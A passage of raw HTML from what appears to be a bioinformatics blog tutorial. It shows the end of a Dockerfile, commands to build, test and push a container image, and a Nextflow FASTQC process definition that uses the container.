root</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">ENV</span><span class="token instruction"> PATH=</span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"$MAMBA_ROOT_PREFIX/bin:$PATH"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">WORKDIR</span><span class="token instruction"> /data</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">CMD</span><span class="token instruction"> [</span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"/bin/bash"</span><span class="token instruction">]</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="building-and-using-your-container">Building and Using Your Container<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#building-and-using-your-container" class="hash-link" aria-label="Direct link to Building and Using Your Container" title="Direct link to Building and Using Your Container" translate="no">​</a></h3>
<p><strong>1. Build the image:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> build </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-t</span><span class="token plain"> myregistry.com/bioinformatics/biotools:1.0 </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><br></span></code></pre></div></div>
<p><strong>2. Test it locally:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string environment constant" style="color:hsl(35, 99%, 36%)">$PWD</span><span class="token string" style="color:hsl(119, 34%, 47%)">:/data"</span><span class="token plain"> myregistry.com/bioinformatics/biotools:1.0 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    fastqc /data/sample.fastq</span><br></span></code></pre></div></div>
<p><strong>3. Push to registry:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> push myregistry.com/bioinformatics/biotools:1.0</span><br></span></code></pre></div></div>
<p><strong>4. Use in Nextflow:</strong></p>
<div class="language-groovy codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-groovy codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process FASTQC </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tag </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">id</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    label </span><span class="token string" style="color:hsl(119, 34%, 47%)">'process_medium'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    conda </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">moduleDir</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">/environment.yml"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    container "</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">$</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> workflow</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">containerEngine </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'singularity'</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain">task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">singularity_pull_docker_container </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">'https://depot.galaxyproject.org/singularity/fastqc:0.12.1--hdfd78af_0'</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">'biocontainers/fastqc:0.12.1--hdfd78af_0'</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    input</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple </span><span class="token function" style="color:hsl(221, 87%, 60%)">val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">reads</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    output</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple </span><span class="token function" style="color:hsl(221, 87%, 60%)">val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"*.html"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> html</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple </span><span class="token function" style="color:hsl(221, 87%, 60%)">val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"*.zip"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> zip</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    path  </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"versions.yml"</span><span class="token plain">           </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> versions</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token spock-block">when:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">when </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> null </span><span class="token operator" style="color:hsl(221, 87%, 60%)">||</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">when</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    script</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> args          </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">args </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">''</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> prefix        </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">prefix </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?:</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">id</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)">// Make list of old name and new name pairs to use for renaming in the bash while loop</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> old_new_pairs </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> reads </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">instanceof</span><span class="token plain"> </span><span class="token class-name" style="color:hsl(35, 99%, 36%)">Path</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">||</span><span class="token plain"> reads</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">size</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> reads</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">prefix</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">reads</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">extension</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> reads</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">withIndex</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">collect </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> entry</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> index </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> entry</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">prefix</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">_</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">index </span><span class="token interpolation-string interpolation expression operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token interpolation-string interpolation expression"> </span><span class="token interpolation-string interpolation expression number" style="color:hsl(35, 99%, 36%)">1</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">entry</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">extension</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> rename_to     </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> old_new_pairs</span><span class="token operator" style="color:hsl(221, 87%, 60%)">*.</span><span class="token function" style="color:hsl(221, 87%, 60%)">join</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">' '</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">join</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">' '</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> renamed_files </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> old_new_pairs</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">collect</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> _old_name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> new_name </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-&gt;</span><span class="token plain"> new_name </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">join</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">' '</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)">// The total amount of allocated RAM by FastQC is equal to the number of threads defined (--threads) time the amount of RAM defined (--memory)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)">// https://github.com/s-andrews/FastQC/blob/1faeea0412093224d7f6a07f777fad60a5650795/fastqc#L211-L222</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)">// Dividing the task.memory by task.cpu allows to stick to requested amount of RAM in the label</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> memory_in_mb </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">memory</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">toUnit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">'MB'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">cpus </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> null</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)">// FastQC memory value allowed range (100 - 10000)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> fastqc_memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> memory_in_mb </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">10000</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">10000</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">memory_in_mb </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">100</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">100</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> memory_in_mb</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"""</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    printf "%s %s\\n" </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">rename_to</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> | while read old_name new_name; do</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        [ -f "\${new_name}" ] || ln -s \$old_name \$new_name</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    done</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="display:inline-block;color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    fastqc \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">args</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        --threads </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">task</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">cpus</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        --memory </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">fastqc_memory</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">renamed_files</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="display:inline-block;color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    cat &lt;&lt;-END_VERSIONS &gt; versions.yml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    "</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">task</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">process</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">":</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        fastqc: \$( fastqc --version | sed '/FastQC v/!d; s/.*v//' )</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    END_VERSIONS</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    stub</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> prefix </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">prefix </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?:</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">id</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 